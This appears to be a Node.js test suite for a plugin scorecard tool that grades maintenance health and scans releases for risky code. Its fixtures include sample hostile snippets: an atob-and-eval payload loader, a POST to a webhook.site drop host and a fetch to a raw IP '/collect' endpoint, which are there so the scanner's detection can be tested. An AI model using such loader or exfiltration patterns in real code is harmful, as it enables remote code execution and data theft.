import assert from "node:assert/strict";
import { test } from "node:test";
import {
  dependencyFinding,
  licenseFinding,
  provenanceFinding,
  scanRelease,
  scoreHealth,
  scoreReview,
  scorecardDocument,
} from "../scripts/scorecard-lib.mjs";

const NOW = Date.parse("2026-06-01T00:00:00.000Z");
const daysAgo = (days) => new Date(NOW - days * 24 * 60 * 60 * 1000).toISOString();

const healthySignals = {
  hasReadme: true,
  hasLicense: true,
  hasContributing: true,
  hasDescription: true,
  lastCommitAt: daysAgo(2),
  lastReleaseAt: daysAgo(3),
  commitsPastYear: 400,
  contributors: 3,
  openIssues: 4,
  closedIssues: 200,
  installs: 30_500,
  stars: 2700,
};

test("a busy, documented, widely installed plugin scores excellent", () => {
  const health = scoreHealth(healthySignals, NOW);
  assert.equal(health.grade, "excellent");
  assert.equal(health.bars, 4);
  assert.equal(health.summary, "This plugin is actively maintained.");
  assert.deepEqual(
    health.sections.map((section) => section.id),
    ["hygiene", "maintenance", "responsiveness", "adoption"],
  );
});

test("maintenance caps the overall grade", () => {
  // Everything else is perfect; the repository has not been touched in years.
  const health = scoreHealth(
    { ...healthySignals, lastCommitAt: daysAgo(900), lastReleaseAt: daysAgo(900), commitsPastYear: 0 },
    NOW,
  );
  assert.equal(health.grade, "failing");
  assert.equal(health.summary, "This plugin looks dormant.");
});

test("a young plugin with no issue history is not punished for it", () => {
  const quiet = scoreHealth(
    { ...healthySignals, openIssues: 0, closedIssues: 0, installs: 40, stars: 5 },
    NOW,
  );
  const responsiveness = quiet.sections.find((section) => section.id === "responsiveness");
  assert.ok(responsiveness.points >= 0.5, `expected a neutral score, got ${responsiveness.points}`);
  assert.match(responsiveness.detail, /No issues yet/);
});

test("hygiene names what is missing", () => {
  const health = scoreHealth({ ...healthySignals, hasLicense: false, hasContributing: false }, NOW);
  const hygiene = health.sections.find((section) => section.id === "hygiene");
  assert.match(hygiene.detail, /Missing: license, contributing guide\./);
});

test("counts read as English at one", () => {
  const health = scoreHealth({ ...healthySignals, commitsPastYear: 1, contributors: 1 }, NOW);
  const maintenance = health.sections.find((section) => section.id === "maintenance");
  const responsiveness = health.sections.find((section) => section.id === "responsiveness");
  assert.match(maintenance.detail, /1 commit in the past year/);
  assert.match(responsiveness.detail, /1 contributor\./);
});

test("a clean release passes and discloses nothing alarming", () => {
  const scan = scanRelease(
    [{ path: "server.ts", text: "export const start = () => console.log('hello');\n" }],
    { name: "clean-plugin" },
  );
  assert.equal(scan.findings.find((item) => item.check === "obfuscation").severity, "pass");
  assert.equal(scan.findings.find((item) => item.check === "network").severity, "pass");
  assert.deepEqual(scan.capabilities, []);
});

test("obfuscated code fails the review", () => {
  const scan = scanRelease([
    { path: "main.js", text: "const _0xdeadbeef = ['a'];\nfunction _0x1234(){}\n" },
  ]);
  const obfuscation = scan.findings.find((item) => item.check === "obfuscation");
  assert.equal(obfuscation.severity, "fail");
  assert.equal(scoreReview(scan.findings).verdict, "failed");
});

test("decoding a payload and evaluating it fails the review", () => {
  const scan = scanRelease([
    { path: "loader.js", text: "const payload = atob(remote); eval(payload);\n" },
  ]);
  assert.equal(scan.findings.find((item) => item.check === "obfuscation").severity, "fail");
});

test("an anonymous drop host fails, a hardcoded IP only warns", () => {
  const exfil = scanRelease([
    { path: "send.ts", text: "await fetch('https://webhook.site/abc', { method: 'POST' });\n" },
  ]);
  assert.equal(exfil.findings.find((item) => item.check === "network").severity, "fail");

  const rawIp = scanRelease([
    { path: "send.ts", text: "await fetch('http://203.0.113.9:8080/collect');\n" },
  ]);
  assert.equal(rawIp.findings.find((item) => item.check === "network").severity, "warn");
});

test("localhost is not treated as a hardcoded remote address", () => {
  const scan = scanRelease([
    { path: "client.ts", text: "await fetch('http://127.0.0.1:31337/health');\n" },
  ]);
  assert.equal(scan.findings.find((item) => item.check === "network").severity, "pass");
});

test("capabilities are derived from the call surface, with evidence", () => {
  const scan = scanRelease(
    [
      { path: "server.ts", text: "import { execFile } from 'node:child_process';\nprocess.env.TOKEN;\n" },
      { path: "app.tsx", text: "await fetch(url);\n" },
    ],
    { bb: { host: "dist/host.js" } },
  );
  const ids = scan.capabilities.map((capability) => capability.id).sort();
  assert.deepEqual(ids, ["host-daemon", "network", "secrets", "shell"]);
  const shell = scan.capabilities.find((capability) => capability.id === "shell");
  assert.equal(shell.severity, "warn");
  assert.deepEqual(shell.evidence, ["server.ts"]);
  const host = scan.capabilities.find((capability) => capability.id === "host-daemon");
  assert.deepEqual(host.evidence, ["package.json"]);
});

test("a missing lockfile is reported as an absent scan, not a pass", () => {
  const item = dependencyFinding(null);
  assert.equal(item.severity, "info");
  assert.match(item.message, /not available/);
});

test("a critical vulnerability fails, a lesser one flags", () => {
  const critical = dependencyFinding([
    { package: "left-pad", version: "1.0.0", id: "GHSA-xxxx", critical: true },
  ]);
  assert.equal(critical.severity, "fail");
  const moderate = dependencyFinding([
    { package: "left-pad", version: "1.0.0", id: "GHSA-xxxx", critical: false },
  ]);
  assert.equal(moderate.severity, "warn");
  assert.match(moderate.message, /left-pad@1\.0\.0 \(GHSA-xxxx\)/);
});

test("licenses are classified, and a missing one warns", () => {
  assert.equal(licenseFinding("MIT").severity, "pass");
  assert.equal(licenseFinding("GPL-3.0").severity, "info");
  assert.equal(licenseFinding(null).severity, "warn");
});

test("provenance depends on the source kind", () => {
  assert.equal(provenanceFinding({ npm: { package: "x" } }, true).severity, "pass");
  assert.equal(provenanceFinding({ npm: { package: "x" } }, false).severity, "info");
  assert.match(provenanceFinding({ git: { url: "x" } }, false).message, /Git tag/);
});

test("the verdict takes the worst severity and counts the rest", () => {
  const passed = scoreReview([
    { severity: "pass", check: "a", message: "" },
    { severity: "info", check: "b", message: "" },
  ]);
  assert.equal(passed.verdict, "passed");
  assert.equal(passed.summary, "1 issue found by automated scans of the latest release.");
  assert.equal(passed.findings[0].severity, "info", "worst finding sorts first");

  assert.equal(scoreReview([{ severity: "warn", check: "a", message: "" }]).verdict, "flagged");
  assert.equal(scoreReview([{ severity: "fail", check: "a", message: "" }]).verdict, "failed");
});

test("an unscanned release is pending, never passed", () => {
  const review = scoreReview([]);
  assert.equal(review.verdict, "pending");
  assert.equal(review.bars, 0);
});

test("the document sorts plugins and stamps the given time", () => {
  const document = scorecardDocument({ zulu: { a: 1 }, alpha: { a: 2 } }, "2026-06-01T00:00:00.000Z");
  assert.deepEqual(Object.keys(document.plugins), ["alpha", "zulu"]);
  assert.equal(document.schemaVersion, 1);
  assert.equal(document.generatedAt, "2026-06-01T00:00:00.000Z");
});

test("the composed document validates against the published schema", async () => {
  const { default: Ajv } = await import("ajv/dist/2020.js");
  const { default: addFormats } = await import("ajv-formats");
  const { readFileSync } = await import("node:fs");
  const schema = JSON.parse(readFileSync(new URL("../schema/scorecards.schema.json", import.meta.url), "utf8"));
  const ajv = new Ajv({ allErrors: true, strict: false });
  addFormats(ajv);
  const validate = ajv.compile(schema);

  const scan = scanRelease([{ path: "server.ts", text: "import 'node:fs';\nawait fetch(url);\n" }], {
    license: "MIT",
  });
  const document = scorecardDocument({
    "example-plugin": {
      repository: "example/bb-plugin-example",
      license: "MIT",
      health: scoreHealth(healthySignals, NOW),
      review: {
        ...scoreReview([...scan.findings, dependencyFinding([]), licenseFinding("MIT"), provenanceFinding({ git: {} }, false)]),
        release: "v1.2.3",
        scannedFiles: 1,
        capabilities: scan.capabilities,
      },
    },
    "npm-only-plugin": {
      health: null,
      review: { ...scoreReview([]), error: "npm package has no tarball" },
    },
  });

  assert.ok(validate(document), JSON.stringify(validate.errors, null, 2));
});

test("minified sources are reported without failing the review", () => {
  const scan = scanRelease([{ path: "lib/marks.ts", text: `const table = "${"x".repeat(6000)}";\n` }]);
  assert.equal(scan.findings.find((item) => item.check === "obfuscation").severity, "pass");
  const generated = scan.findings.find((item) => item.check === "generated");
  assert.equal(generated.severity, "warn");
  assert.equal(scoreReview(scan.findings).verdict, "flagged");
});

test("data files are exempt from the code heuristics", () => {
  const scan = scanRelease([
    { path: "data/icons.json", text: `{"blob":"${"A".repeat(4000)}"}\n` },
  ]);
  assert.equal(scan.findings.find((item) => item.check === "obfuscation").severity, "pass");
  assert.equal(scan.findings.find((item) => item.check === "generated"), undefined);
});
